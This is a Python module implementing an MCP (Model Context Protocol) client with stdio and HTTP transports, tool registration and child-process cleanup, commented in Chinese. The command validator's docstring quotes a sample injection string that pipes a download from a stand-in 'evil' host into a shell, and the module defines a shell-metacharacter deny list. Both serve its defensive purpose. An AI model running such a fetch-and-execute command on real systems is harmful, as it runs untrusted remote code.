"""MCP 客户端 —— 接入外部工具服务.

从 Node 版 src/tools/mcp-client.js 逐条移植。

MCP(Model Context Protocol)让我们能接上别人写好的工具服务: 浏览器自动化、
数据库、文件系统、GitHub……不用自己重写一遍。

两种传输:
  · **stdio**: 我们拉起一个子进程, 用标准输入输出通信。能接的东西最多
    (大多数 MCP 服务是这个形态), 但**风险也最大** —— 它会在你机器上执行命令。
    所以配置里必须写 `enabled: true` 才会启动。
  · **http**: 连一个已经在跑的服务。风险小, 但需要用户自己有那个服务。

三条工程纪律(与 Node 版同):
  1. **服务挂了不能拖垮主流程**。连接失败就记一条警告、跳过它, 其他工具照常可用。
     用户不该因为「某个 MCP 服务没起来」而整个用不了。
  2. **必须能干净退出**。stdio 服务是子进程, 不关就会变成孤儿进程 ——
     用户关了程序之后发现一堆 node 进程还在跑, 这是很糟的体验。
     `close_mcp_servers()` 必须由调用方在退出前调用(server.py 的 lifespan/SIGINT),
     模块另注册了 atexit 兜底。
  3. **工具名要加前缀**(`服务名__工具名`)。两个服务都有 `search` 时不能互相覆盖。

════════════ 移植取舍(与 Node 版的差异) ════════════
1. **没有官方 SDK 就不引依赖**。本机 .venv 里 `import mcp` 失败, 按任务要求
   直接实现 JSON-RPC over stdio 与 Streamable HTTP。协议面只覆盖我们真正用到的
   三个请求: `initialize` / `tools/list` / `tools/call`, 外加 `notifications/initialized`
   与 `notifications/cancelled`。**没有实现**: 采样、roots、resources、prompts、
   progress、SSE 服务端推送的流式增量 —— 契约里前端只消费工具结果文本。
2. **用同步线程而不是 asyncio**。Node 版的 client 是 Promise; Python 这边一次 MCP
   工具调用本来就要等子进程回包, 起线程 + Future 比把整个工具循环染成 async 更小。
   读线程是 daemon, 不会挂住解释器退出。
   ⚠️ 由此带来一条调用约定: handler 是**同步阻塞**的。async 调用方(ex. 将来的
   工具循环 in engine.py)若要跑 MCP 工具, 请用 `asyncio.to_thread(...)` 包一层,
   否则会把事件循环卡住一整个 callTimeout。
3. **子进程独立成进程组(start_new_session)**。`npx -y some-mcp` 会再拉起一个 node
   子进程, 只 kill 直接子进程同样会留下孤儿 —— 退出时按**进程组**杀。
4. **命令额外做了一次注入校验**(`_validate_command`)。Node 版把 command 原样交给
   spawn(SDK 自己不经 shell); Python 这边显式拒绝 shell 元字符、强制 argv 形态、
   绝不用 `shell=True`, 并且只把 PATH/HOME + 用户显式声明的 env 传给子进程 ——
   绝不透传整个 os.environ, 那等于把 API Key 交给一个第三方程序。
5. **复用已有的 src_py/tools.py 注册表**(它是 src/tools/registry.js 的移植),
   不另起一套。`register_tool` / `unregister_tool` / `unregister_by_prefix` /
   `execute_tool` 全部直接用那边的。
   注意 src_py 的注册表尚未移植 Node 版 registry 的 source/dangerous/工具名正则 ——
   所以 MCP 工具名在**本模块**里就规范成 `^[a-z][a-z0-9_]{0,63}$`(见 `mcp_tool_name`),
   不依赖注册表兜底。source/dangerous 是 Node registry 的字段, 待那一侧补齐后
   在 `_register` 里补上即可, 现在凭空塞会被注册表忽略。
"""

from __future__ import annotations

import atexit
import json
import os
import re
import shutil
import signal
import subprocess
import sys
import threading
from concurrent.futures import Future, TimeoutError as FutureTimeout
from typing import Any, Callable, Mapping, Sequence

try:  # urllib 是标准库, 但 import 失败只影响 http 型服务, 不影响 stdio
    import urllib.error
    import urllib.request
except Exception:  # pragma: no cover - 理论上不会发生
    urllib = None  # type: ignore[assignment]

# 复用已有的注册表模块。src_py 内所有模块都是平铺的, 由 server.py 往 sys.path
# 插入 src_py 目录后按**裸名**互相 import —— 这里保持同样的方式, 免得同一份代码
# 被以 `tools` 和 `src_py.tools` 两种身份加载成两个模块、两张注册表
# (那会表现为「工具注册成功却调不到」, 极难排查)。
sys.path.insert(0, os.path.dirname(os.path.abspath(__file__)))
import tools as _tools_mod

__all__ = [
    "MAX_TOOL_OUTPUT_CHARS",
    "MCP_PROTOCOL_VERSION",
    "McpError",
    "McpClient",
    "StdioTransport",
    "StreamableHTTPTransport",
    "mcp_state",
    "mcp_tool_name",
    "render_mcp_content",
    "clip_output",
    "load_mcp_servers",
    "close_mcp_servers",
    "mcp_summary",
    "__reset_mcp_for_test",
]

# 工具输出注入回模型时的上限(字符), 与 src/tools/registry.js 的 MAX_TOOL_OUTPUT_CHARS 对齐
MAX_TOOL_OUTPUT_CHARS = 12000

# 我们对外声明的 MCP 协议版本。2024-11-05 是 stdio 服务端最普遍支持的一版;
# 服务端会回它自己支持的版本, 我们按它回的走。
MCP_PROTOCOL_VERSION = "2024-11-05"

CLIENT_INFO = {"name": "handoff", "version": "1.0.0"}

# 注册表要求的工具名形态(与 src/tools/registry.js 一致)
_TOOL_NAME_RE = re.compile(r"^[a-z][a-z0-9_]{0,63}$")

# 命令/参数里出现即拒绝的字符。**这不是主要防线** —— 主要防线是「argv 列表 +
# shell=False」, 下面的字符交给 shell 才有意义, 不经过 shell 时只是普通字符。
# 之所以还要挡: 让「配置里写一行 shell 片段」这种写法尽早、明确地报错, 而不是
# 等到将来某次改动不小心引入 shell=True 才爆。宁可让用户重写一行配置。
_SHELL_METACHARS = set(";|&$`<>(){}[]*?!~#\n\r\t\"'\\")

_IMAGE_NOTE = "（这个工具返回了一张图片，我这边只能处理文字，看不到图片内容）"


class McpError(Exception):
    """MCP 传输/协议层错误. 一律被上层转成 ok=False 的结果, 不向外抛."""


_TOOL_NAME_RE = re.compile(r"^[a-z][a-z0-9_]{0,63}$")


# --------------------------------------------------------------------------
# 工具注册表: 直接用 src_py/tools.py 那一份, 不另起一套
# --------------------------------------------------------------------------
#
# ⚠️ 这是一处**刻意的取舍**: Node 版 mcp-client.js 从 registry.js 拿
# registerTool / clipOutput, Python 这边对应物就是 src_py/tools.py(已经移植好)。
# 如果这里再写一个自己的注册表, 就会出现两张表 —— MCP 工具注册到 A 表、
# 模型循环从 B 表取工具, 现象是「工具明明注册成功却调不到」。这类问题极难排查,
# 所以宁可让 MCP 依赖 tools.py。
#
# 缺什么: Node registry 的 source / dangerous / 工具名正则, src_py/tools.py 还没移植。
# 应对: 工具名在**本模块**规范好(mcp_tool_name 保证合法),
# source/dangerous 等那一侧补齐后在 _register_tool 里一起传。


def _register_tool(tool: Mapping[str, Any]) -> Any:
    """注册一个 MCP 工具. 一个坏工具不该让整个服务断掉, 所以失败只记警告."""
    try:
        return _tools_mod.register_tool({
            "name": tool["name"],
            "description": tool["description"],
            "parameters": tool["parameters"],
            "handler": tool["handler"],
        })
    except Exception as err:                       # noqa: BLE001
        _warn(f"注册 MCP 工具失败（已跳过）：{tool.get('name')} —— {err}")
        return None


def _unregister_tools(names: list[str]) -> None:
    """断开时按**注册时记下的确切名字**注销, 不靠前缀猜."""
    for n in names:
        try:
            _tools_mod.unregister_tool(n)
        except Exception:                          # noqa: BLE001
            pass


def _warn(message: str) -> None:
    """非致命问题只打印一行 —— 与 server.py 里 `[tools]`/`[skills]` 的口气一致."""
    try:
        print(f"[mcp] {message}")
    except Exception:                              # pragma: no cover
        pass


# 输出截断直接复用注册表那份(同一套标注文案, 免得两处文案漂移)
clip_output = _tools_mod.clip_output


# --------------------------------------------------------------------------
# 工具名规范化
# --------------------------------------------------------------------------


def _clean_name(value: Any) -> str:
    """小写 + 非 [a-z0-9_] 换成下划线 + 去首尾下划线 + 截到 40 字符."""
    s = re.sub(r"[^a-z0-9_]+", "_", str(value if value is not None else "").lower())
    s = re.sub(r"^_+|_+$", "", s)[:40]
    return s or "tool"


def mcp_tool_name(server_name: Any, tool_name: Any) -> str:
    """把 MCP 的工具名规范化成注册表允许的形式, 并加上服务前缀.

    前缀是必须的: 两个服务都有 `search` 时不能互相覆盖。
    总长截到 64(注册表上限)。截断后若首字符不是字母, 补一个 `t` ——
    否则注册表会拒绝, 整个服务的工具就全丢, 而「服务名以数字开头」不该是致命错误。
    """
    name = f"{_clean_name(server_name)}__{_clean_name(tool_name)}"[:64]
    if not name or not name[0].isalpha() or not name[0].isascii():
        name = ("t" + name)[:64]
    return name


# --------------------------------------------------------------------------
# 返回内容渲染
# --------------------------------------------------------------------------


def render_mcp_content(res: Any) -> str:
    """MCP 的返回可能是文本、图片、资源链接的混合数组.

    我们只取**文本**部分 —— 图片对纯文本模型没有意义, 硬塞反而是噪音。
    """
    if not isinstance(res, Mapping):
        res = {}
    parts = res.get("content")
    parts = parts if isinstance(parts, list) else []
    texts: list[str] = []
    for p in parts:
        if not isinstance(p, Mapping):
            continue
        if p.get("type") == "text" and isinstance(p.get("text"), str):
            texts.append(p["text"])
        elif p.get("type") == "resource" and isinstance(p.get("resource"), Mapping) \
                and isinstance(p["resource"].get("text"), str):
            texts.append(p["resource"]["text"])
        elif p.get("type") == "image":
            texts.append(_IMAGE_NOTE)
    if not texts:
        # 有些服务把结果放在 structuredContent 里
        if res.get("structuredContent") is not None:
            try:
                return clip_output(json.dumps(res["structuredContent"], ensure_ascii=False, indent=2))
            except (TypeError, ValueError):
                # Node 版这里 catch 后落到下面的兜底; 我们额外用 default=str 再试一次,
                # 因为「结构里有不可序列化对象」不该让用户只看到一句"没返回文字"。
                try:
                    return clip_output(json.dumps(res["structuredContent"], ensure_ascii=False,
                                                  indent=2, default=str))
                except Exception:
                    pass
        return "（工具报错了，但没有给出说明）" if res.get("isError") else "（工具没有返回文字内容）"
    return clip_output("\n\n".join(texts))


# --------------------------------------------------------------------------
# 传输层
# --------------------------------------------------------------------------


def _validate_command(command: Any, args: Any) -> tuple[str, list[str]]:
    """把配置里的 command/args 变成可以安全交给 Popen 的 argv.

    **绝不执行用户给的 shell 字符串**: 拒绝含 shell 元字符的命令与参数,
    并且调用方一律 `shell=False`。这不是多余的一层 —— 配置文件是给人看的,
    一旦有人写成 `"command": "npx -y foo && curl evil | sh"`, spawn 只会
    报「找不到这个文件」, 而 shell 执行就会真的跑起来。
    """
    if not isinstance(command, str) or not command.strip():
        raise McpError("stdio 服务缺少 command")
    cmd = command.strip()
    if cmd in (".", ".."):
        raise McpError(f"stdio 服务的 command 非法（收到「{cmd}」）")
    # 允许可执行文件名(走 PATH)或绝对/相对路径 —— 跑自己编译出来的 MCP 服务端
    # 是合理用法。真正防注入靠的是「argv 列表 + shell=False」, 不是禁止路径。
    for ch in cmd:
        if ch in _SHELL_METACHARS or ch.isspace():
            raise McpError(f"stdio 服务的 command 含非法字符，已拒绝（收到「{cmd}」）")

    out: list[str] = []
    if not isinstance(args, (list, tuple)):
        args = []
    for a in args:
        if not isinstance(a, str):
            raise McpError("stdio 服务的 args 必须是字符串列表")
        for ch in a:
            if ch in _SHELL_METACHARS:
                raise McpError(f"stdio 服务的 args 含 shell 元字符，已拒绝（收到「{a}」）")
        out.append(a)

    resolved = shutil.which(cmd)
    if resolved is None:
        # 交给 Popen 去报错, 错误信息一样进 mcp_state —— 但先明确一点更好排查
        raise McpError(f"找不到可执行文件：{cmd}")
    return resolved, out


class _Transport:
    """传输层接口. 只管「把一行 JSON-RPC 送出去、把回来的行拿进来」+ 收尾."""

    def start(self) -> None:  # pragma: no cover - 抽象
        raise NotImplementedError

    def request(self, message: Mapping[str, Any], timeout_ms: int) -> Mapping[str, Any]:  # pragma: no cover
        raise NotImplementedError

    def notify(self, message: Mapping[str, Any]) -> None:  # pragma: no cover - 抽象
        raise NotImplementedError

    def close(self) -> None:  # pragma: no cover - 抽象
        raise NotImplementedError


class StdioTransport(_Transport):
    """拉起子进程, 用标准输入输出走换行分隔的 JSON-RPC.

    子进程**独立成进程组**(start_new_session), 退出时按进程组杀 ——
    因为 `npx -y some-mcp` 会再拉起一个 node 子进程, 只杀直接子进程会留孤儿。
    """

    def __init__(self, command: str, args: Sequence[str], env: Mapping[str, str] | None = None,
                 connect_timeout_ms: int = 30000) -> None:
        self.command = command
        self.args = list(args)
        # 只透传必要变量 + 用户显式给的 env。**不要把整个 os.environ 传进去** ——
        # 那等于把 API Key 交给一个第三方程序。
        self.env = {
            "PATH": os.environ.get("PATH", ""),
            "HOME": os.environ.get("HOME", ""),
            **{str(k): str(v) for k, v in (env or {}).items()},
        }
        self.connect_timeout_ms = connect_timeout_ms
        self.proc: subprocess.Popen | None = None
        self._pending: dict[int, Future] = {}
        self._lock = threading.RLock()
        self._write_lock = threading.Lock()
        self._next_id = 1
        self._closed = False
        self._dead: McpError | None = None

    # -- 生命周期 ---------------------------------------------------------

    def start(self) -> None:
        try:
            self.proc = subprocess.Popen(
                [self.command, *self.args],
                stdin=subprocess.PIPE,
                stdout=subprocess.PIPE,
                stderr=subprocess.DEVNULL,   # 子进程的 stderr 不要灌进我们的日志
                env=self.env,
                shell=False,                 # 关键: 绝不经过 shell
                bufsize=0,                   # 二进制裸管道: 换行分帧由我们自己切
                start_new_session=True,      # 独立进程组, 退出时整组杀
            )
        except (OSError, ValueError) as err:
            raise McpError(f"启动 MCP 子进程失败：{err}") from err

        threading.Thread(target=self._read_loop, name="mcp-stdio-read", daemon=True).start()

    def _read_loop(self) -> None:
        """后台线程: 逐行读子进程 stdout, 把响应投递给等在 Future 上的请求方.

        daemon 线程 —— 子进程卡住时也不会挂住解释器退出。
        """
        proc = self.proc
        if proc is None or proc.stdout is None:
            return
        try:
            for raw in proc.stdout:
                line = raw.decode("utf-8", "replace").strip()
                if not line:
                    continue
                try:
                    msg = json.loads(line)
                except ValueError:
                    # 协议外的垃圾输出(ex. 服务端往 stdout 打了日志)不该中断整条通路
                    continue
                if not isinstance(msg, Mapping) or "id" not in msg:
                    continue  # 通知
                with self._lock:
                    fut = self._pending.pop(msg["id"], None)
                if fut is not None and not fut.done():
                    fut.set_result(msg)
        except Exception:
            pass
        finally:
            self._fail_all(McpError("MCP 子进程已退出"))

    def _fail_all(self, err: McpError) -> None:
        self._dead = err
        with self._lock:
            waiting = list(self._pending.values())
            self._pending.clear()
        for fut in waiting:
            if not fut.done():
                fut.set_exception(err)

    # -- 收发 -------------------------------------------------------------

    def _send(self, message: Mapping[str, Any]) -> None:
        proc = self.proc
        if proc is None or proc.stdin is None or proc.poll() is not None:
            raise McpError("MCP 子进程不在运行")
        data = (json.dumps(message, ensure_ascii=False) + "\n").encode("utf-8")
        with self._write_lock:
            try:
                proc.stdin.write(data)
                proc.stdin.flush()
            except (BrokenPipeError, OSError) as err:
                raise McpError(f"写入 MCP 子进程失败：{err}") from err

    def request(self, message: Mapping[str, Any], timeout_ms: int) -> Mapping[str, Any]:
        if self._dead is not None:
            # 子进程已经退出: 快速失败, 不要让调用方白等一个超时
            raise self._dead
        fut: Future = Future()
        with self._lock:
            self._pending[message["id"]] = fut
        try:
            self._send(message)
        except Exception:
            with self._lock:
                self._pending.pop(message["id"], None)
            raise
        try:
            return fut.result(timeout=max(0.001, timeout_ms / 1000.0))
        except FutureTimeout:
            with self._lock:
                self._pending.pop(message["id"], None)
            raise McpError(f"MCP 请求超时（{timeout_ms}ms）：{message.get('method')}") from None

    def notify(self, message: Mapping[str, Any]) -> None:
        self._send(message)

    # -- 收尾 -------------------------------------------------------------

    def close(self) -> None:
        """尽力而为地收掉子进程: TERM 整个进程组 → 等 → KILL 整个进程组.

        关不掉也不该阻断退出(用户按 Ctrl+C 时最忌讳的就是"程序卡在清理上"),
        但**必须试过**, 否则 stdio 型的子孙进程会变成孤儿。
        """
        if self._closed:
            return
        self._closed = True
        proc = self.proc
        if proc is not None:
            _terminate_process_group(proc)
            self.proc = None
        for stream in (proc.stdin if proc else None, proc.stdout if proc else None):
            try:
                if stream is not None:
                    stream.close()
            except Exception:
                pass
        self._fail_all(McpError("MCP 连接已关闭"))


def _terminate_process_group(proc: subprocess.Popen) -> None:
    """TERM 进程组 → 最多等 3 秒 → KILL 进程组. 全程吞掉异常."""
    if proc.poll() is not None:
        return
    try:
        os.killpg(os.getpgid(proc.pid), signal.SIGTERM)
    except (ProcessLookupError, PermissionError, OSError):
        try:
            proc.terminate()
        except Exception:
            pass
    try:
        proc.wait(timeout=3.0)
        return
    except Exception:
        pass
    try:
        os.killpg(os.getpgid(proc.pid), signal.SIGKILL)
    except (ProcessLookupError, PermissionError, OSError):
        try:
            proc.kill()
        except Exception:
            pass
    try:
        proc.wait(timeout=2.0)
    except Exception:
        pass


class StreamableHTTPTransport(_Transport):
    """连一个已经在跑的 MCP 服务(Streamable HTTP).

    只用标准库 urllib: 一次 POST 发 JSON-RPC, 响应可能是 `application/json`,
    也可能是 `text/event-stream`(这时取第一条 `data:` 里 id 对得上的消息)。
    会话 id 走 `Mcp-Session-Id` 响应头, 后续请求带上。
    """

    def __init__(self, url: str, timeout_ms: int = 30000) -> None:
        if not isinstance(url, str) or not url.strip():
            raise McpError("http 服务缺少 url")
        self.url = url.strip()
        if not re.match(r"^https?://", self.url):
            raise McpError(f"MCP http 服务的 url 必须以 http:// 或 https:// 开头（收到「{self.url}」）")
        self.timeout_ms = timeout_ms
        self.session_id: str | None = None
        self._closed = False

    def start(self) -> None:
        return None  # http 无连接可建

    def request(self, message: Mapping[str, Any], timeout_ms: int) -> Mapping[str, Any]:
        if urllib is None:  # pragma: no cover
            raise McpError("当前环境没有 urllib，无法使用 http 型 MCP 服务")
        body = json.dumps(message, ensure_ascii=False).encode("utf-8")
        headers = {
            "Content-Type": "application/json",
            "Accept": "application/json, text/event-stream",
            "MCP-Protocol-Version": MCP_PROTOCOL_VERSION,
        }
        if self.session_id:
            headers["Mcp-Session-Id"] = self.session_id
        req = urllib.request.Request(self.url, data=body, headers=headers, method="POST")
        effective = timeout_ms or self.timeout_ms
        try:
            with urllib.request.urlopen(req, timeout=max(0.001, effective / 1000.0)) as resp:
                sid = resp.headers.get("Mcp-Session-Id")
                if sid:
                    self.session_id = sid
                raw = resp.read()
                ctype = (resp.headers.get("Content-Type") or "").lower()
        except urllib.error.HTTPError as err:
            detail = ""
            try:
                detail = err.read().decode("utf-8", "replace")[:300]
            except Exception:
                pass
            raise McpError(f"MCP http 服务返回 {err.code}：{detail}") from err
        except Exception as err:
            raise McpError(f"MCP http 连接失败：{err}") from err

        text = raw.decode("utf-8", "replace")
        if "text/event-stream" in ctype:
            msg = _parse_sse_response(text)
            if msg is None:
                raise McpError("MCP http 服务的 SSE 响应里没有 JSON-RPC 消息")
            return msg
        try:
            parsed = json.loads(text)
        except ValueError as err:
            raise McpError(f"MCP http 服务返回了非 JSON 内容：{text[:200]}") from err
        if not isinstance(parsed, Mapping):
            raise McpError("MCP http 服务返回的 JSON 不是对象")
        return parsed

    def notify(self, message: Mapping[str, Any]) -> None:
        """通知类的消息服务端可能回 202 空响应, 这里忽略响应内容."""
        try:
            self.request(message, self.timeout_ms)
        except McpError:
            # 通知发不出去不该让整个连接失败 —— 沿 Node 版「尽力而为」的取向
            pass

    def close(self) -> None:
        self._closed = True


def _parse_sse_response(text: str) -> Mapping[str, Any] | None:
    """从 SSE 文本里取第一条能解析成对象的 data: 负载."""
    for line in text.splitlines():
        line = line.strip()
        if not line.startswith("data:"):
            continue
        payload = line[len("data:"):].strip()
        if not payload:
            continue
        try:
            msg = json.loads(payload)
        except ValueError:
            continue
        if isinstance(msg, Mapping):
            return msg
    return None


# --------------------------------------------------------------------------
# 客户端
# --------------------------------------------------------------------------


class McpClient:
    """一个 MCP 客户端连接: 握手 + 三个请求方法 + 关闭.

    同步实现(见模块 docstring 的取舍说明): 内部仍由传输层的读线程并发投递,
    所以 `call_tool` 的调用方拿到的就是最终结果。
    """

    def __init__(self, transport: _Transport, timeout_ms: int = 30000) -> None:
        self.transport = transport
        self.timeout_ms = timeout_ms
        self._id = 0
        self._id_lock = threading.Lock()
        self.server_info: Mapping[str, Any] = {}
        self.protocol_version: str = MCP_PROTOCOL_VERSION
        self._connected = False

    def _next_id(self) -> int:
        with self._id_lock:
            self._id += 1
            return self._id

    def connect(self) -> None:
        """start 传输 → initialize → notifications/initialized."""
        self.transport.start()
        result = self._request("initialize", {
            "protocolVersion": MCP_PROTOCOL_VERSION,
            "capabilities": {},
            "clientInfo": CLIENT_INFO,
        })
        if isinstance(result, Mapping):
            self.protocol_version = str(result.get("protocolVersion") or MCP_PROTOCOL_VERSION)
            info = result.get("serverInfo")
            self.server_info = info if isinstance(info, Mapping) else {}
        # 握手最后一步, 服务端在收到它之前可能拒绝 tools/list
        self.transport.notify({"jsonrpc": "2.0", "method": "notifications/initialized"})
        self._connected = True

    def _request(self, method: str, params: Mapping[str, Any] | None = None,
                 timeout_ms: int | None = None) -> Any:
        rid = self._next_id()
        message: dict[str, Any] = {"jsonrpc": "2.0", "id": rid, "method": method}
        if params is not None:
            message["params"] = dict(params)
        reply = self.transport.request(message, int(timeout_ms or self.timeout_ms))
        if not isinstance(reply, Mapping):
            raise McpError(f"MCP 服务返回了非对象响应：{method}")
        err = reply.get("error")
        if isinstance(err, Mapping):
            raise McpError(f"MCP 错误（{method}）：{err.get('message') or json.dumps(err, ensure_ascii=False)}")
        return reply.get("result")

    def list_tools(self, timeout_ms: int | None = None) -> list[dict[str, Any]]:
        result = self._request("tools/list", {}, timeout_ms)
        tools = result.get("tools") if isinstance(result, Mapping) else None
        return [t for t in tools if isinstance(t, dict)] if isinstance(tools, list) else []

    def call_tool(self, name: str, arguments: Mapping[str, Any] | None = None,
                  timeout_ms: int | None = None) -> Mapping[str, Any]:
        result = self._request("tools/call", {"name": name, "arguments": dict(arguments or {})}, timeout_ms)
        return result if isinstance(result, Mapping) else {}

    def close(self) -> None:
        """尝试发一个 cancelled 通知(服务端可能正在等), 然后关传输."""
        if self._connected:
            try:
                self.transport.notify({"jsonrpc": "2.0", "method": "notifications/cancelled",
                                       "params": {"requestId": self._id, "reason": "client shutdown"}})
            except Exception:
                pass
        self._connected = False
        try:
            self.transport.close()
        except Exception:
            pass


# --------------------------------------------------------------------------
# 模块级状态
# --------------------------------------------------------------------------

# 服务名 -> {client, transport, def, tools: [], local_names: []}
_connections: dict[str, dict[str, Any]] = {}
_connections_lock = threading.RLock()

# 正在连接中的锁(防止并发初始化时重复拉起进程) —— 对应 Node 版的 initPromise
_init_lock = threading.Lock()
_init_done = False

# 已加载的结果(给健康检查用)
mcp_state: dict[str, Any] = {
    "loaded": False,
    "servers": [],   # [{name, type, ok, toolCount, error}]
}


def _safe_close_all() -> None:
    """atexit 兜底: 解释器退出前收掉所有 stdio 子进程.

    server.py 应当显式调用 close_mcp_servers(); 但「忘了调」的代价是用户机器上
    残留一堆 node 进程, 所以这里再兜一层(幂等, 已关过就是空操作)。
    """
    try:
        close_mcp_servers()
    except Exception:
        pass


atexit.register(_safe_close_all)


def _load_mcp_servers_impl(cfg: Mapping[str, Any]) -> dict[str, Any]:
    if not (isinstance(cfg, Mapping) and cfg.get("enabled")):
        mcp_state["loaded"] = True
        mcp_state["servers"] = []
        return mcp_state

    servers = cfg.get("servers")
    servers = servers if isinstance(servers, Mapping) else {}
    call_timeout = _call_timeout_ms(cfg)
    results: list[dict[str, Any]] = []

    for name, def_ in servers.items():
        def_ = def_ if isinstance(def_, Mapping) else {}
        type_ = def_.get("type")
        # stdio 型必须显式 enabled:true —— 它会在用户机器上执行命令
        if type_ == "stdio" and def_.get("enabled") is not True:
            results.append({"name": name, "type": type_, "ok": False, "toolCount": 0,
                            "error": "没写 enabled:true，未启动"})
            continue
        if type_ not in ("stdio", "http"):
            results.append({"name": name, "type": type_ if type_ else "未知", "ok": False,
                            "toolCount": 0, "error": "type 必须是 stdio 或 http"})
            continue

        try:
            results.append(_connect_one(str(name), def_, cfg, call_timeout))
        except Exception as err:
            # 单个服务失败只是记一条, 绝不向上抛 —— 其他工具必须照常可用
            results.append({"name": name, "type": type_, "ok": False, "toolCount": 0,
                            "error": clip_output(str(err), 300)})
    mcp_state["loaded"] = True
    mcp_state["servers"] = results
    return mcp_state


def _call_timeout_ms(cfg: Mapping[str, Any]) -> int:
    """单个 MCP 服务的工具调用超时. 非法值回落到 30000(对应 Node 的 `|| 30000`)."""
    try:
        value = cfg.get("callTimeoutMs")
        if value is None:
            return 30000
        ms = int(float(value))
        return ms if ms > 0 else 30000
    except (TypeError, ValueError):
        return 30000


def load_mcp_servers(cfg: Mapping[str, Any] | None = None) -> dict[str, Any]:
    """启动配置里所有 MCP 服务并把它们的工具注册进注册表(tools.py).

    **不会抛异常**: 任何服务失败都只是记进 mcp_state, 主流程继续。
    重复调用是幂等的(第二次直接返回缓存状态, 不重复拉起进程)。

    cfg: handoff.config.json 的 `mcp` 段 {enabled, callTimeoutMs, servers}
    """
    global _init_done
    cfg = cfg if isinstance(cfg, Mapping) else {}
    with _init_lock:
        if _init_done:
            return mcp_state
        try:
            return _load_mcp_servers_impl(cfg)
        finally:
            _init_done = True


def _connect_one(name: str, def_: Mapping[str, Any], cfg: Mapping[str, Any],
                 call_timeout: int) -> dict[str, Any]:
    """连一个服务、发现工具、逐个注册. 失败往上抛, 由 load 层归一成一行错误."""
    transport = _build_transport(name, def_, cfg, call_timeout)

    client = McpClient(transport, timeout_ms=call_timeout)
    try:
        client.connect()
        tools = client.list_tools()
    except Exception:
        # 连不上/列不出工具: 必须把子进程收掉再抛, 否则失败的服务会留下孤儿
        try:
            client.close()
        except Exception:
            pass
        raise

    registered = 0
    local_names: list[str] = []
    remote_names: list[str] = []
    for t in tools:
        original_name = t.get("name")
        if not original_name:
            continue
        local_name = mcp_tool_name(name, original_name)
        schema = _as_object_schema(t.get("inputSchema"))
        entry = _register_tool({
            "name": local_name,
            "description": f"[{name}] {t.get('description') or f'来自 {name} 服务的工具'}",
            "parameters": schema,
            "handler": _make_handler(client, name, original_name, call_timeout),
        })
        if entry is None:
            continue          # 单个工具注册失败已记警告, 其他工具照常注册
        registered += 1
        local_names.append(local_name)
        remote_names.append(original_name)

    with _connections_lock:
        _connections[name] = {
            "client": client,
            "transport": transport,
            "def": dict(def_),
            "tools": remote_names,
            "local_names": local_names,
        }
    return {"name": name, "type": def_.get("type"), "ok": True,
            "toolCount": registered, "error": None}


def _make_handler(client: McpClient, server_name: str, tool_name: str,
                  call_timeout: int) -> Callable[[Mapping[str, Any]], dict[str, Any]]:
    """把一次 MCP 调用包成注册表要的 handler.

    ⚠️ MCP 协议里「工具执行失败」有两种表现形式:
      a) 传输层抛异常
      b) 正常返回一个**带 `isError: true` 的结果**(工具内部报错走这条)
    只处理 (a) 的话, (b) 会被当成成功 —— 模型拿到一段错误文字却以为拿到了数据,
    于是拿着「错误信息」往下写, 交付物就带上了幻觉。
    """

    # ⚠️ 签名必须与 tools.py 的 execute_tool 对齐: 它是 `t.handler(args, ctx)`.
    # 只收一个参数的话, 每次调用都会变成
    #   `TypeError: handler() takes 1 positional argument but 2 were given`
    # 而 execute_tool 会把它归一成「执行出错：TypeError」—— 工具看起来"存在但坏掉",
    # 真实错误被吃掉。ctx 我们不用, 但必须收下来。
    def handler(args: Mapping[str, Any] | None = None,
                ctx: Mapping[str, Any] | None = None) -> dict[str, Any]:
        try:
            res = client.call_tool(tool_name, args, timeout_ms=call_timeout)
        except Exception as err:
            return {"ok": False, "text": "",
                    "error": f"MCP 工具 {server_name}/{tool_name} 调用失败：{clip_output(str(err), 300)}"}
        if res.get("isError"):
            return {"ok": False, "text": "",
                    "error": render_mcp_content(res) or f"MCP 工具 {server_name}/{tool_name} 执行失败",
                    "meta": {"mcpServer": server_name, "tool": tool_name, "isError": True}}
        return {"ok": True, "text": render_mcp_content(res),
                "meta": {"mcpServer": server_name, "tool": tool_name}}

    return handler


def _as_object_schema(schema: Any) -> dict[str, Any]:
    """注册表要求 parameters.type === 'object', 不合法就地修正.

    就地改(而不是拷贝)是刻意的 —— 与 Node 版一致, 保证调用方拿到的 schema
    与工具列表里的是同一份; schema 只读时退化成浅拷贝。
    """
    if not isinstance(schema, dict):
        return {"type": "object", "properties": {}}
    if schema.get("type") != "object":
        try:
            schema["type"] = "object"
        except TypeError:  # 只读映射
            schema = {**schema, "type": "object"}
    return schema


def _build_transport(name: str, def_: Mapping[str, Any], cfg: Mapping[str, Any],
                     call_timeout: int) -> _Transport:
    if def_.get("type") == "stdio":
        env = def_.get("env")
        command, args = _validate_command(def_.get("command"), def_.get("args"))
        return StdioTransport(command, args,
                              env=env if isinstance(env, Mapping) else {},
                              connect_timeout_ms=call_timeout)
    return StreamableHTTPTransport(str(def_.get("url") or ""), timeout_ms=call_timeout)


def close_mcp_servers() -> list[dict[str, Any]]:
    """断开所有 MCP 连接, 并从注册表里注销它们带来的工具.

    **必须在进程退出前调用**, 否则 stdio 型的子进程会变成孤儿 ——
    用户关掉程序之后发现一堆 npx/node 进程还在跑。

    先取快照、再清空(不是先清空再遍历): Node 版曾经先 clear 了 Map 又去遍历它,
    那段清理循环是**死代码**, 工具永远留在注册表里。
    """
    global _init_done
    results: list[dict[str, Any]] = []
    with _connections_lock:
        entries = list(_connections.items())
        _connections.clear()
    for name, conn in entries:
        try:
            conn["client"].close()
        except Exception as err:
            results.append({"name": name, "error": clip_output(str(err), 200)})
        try:
            conn["transport"].close()
        except Exception:
            pass  # 尽力而为: 能关就关, 关不掉也不该阻断退出

        # 用注册时记下来的**精确**名字注销, 不靠前缀猜
        names = conn.get("local_names")
        names = names if isinstance(names, list) else []
        if names:
            _unregister_tools(names)
        else:
            _tools_mod.unregister_by_prefix(mcp_tool_name(name, ""))

    _init_done = False
    mcp_state["loaded"] = False
    mcp_state["servers"] = []
    return results


def mcp_summary() -> dict[str, Any]:
    """目前接上了哪些服务(给健康检查用)."""
    return {
        "enabled": bool(mcp_state["loaded"] and mcp_state["servers"]),
        "servers": mcp_state["servers"],
    }


def __reset_mcp_for_test() -> None:
    """测试用: 重置内部状态(不负责关进程 —— 先调 close_mcp_servers)."""
    global _init_done
    with _connections_lock:
        _connections.clear()
    _init_done = False
    mcp_state["loaded"] = False
    mcp_state["servers"] = []
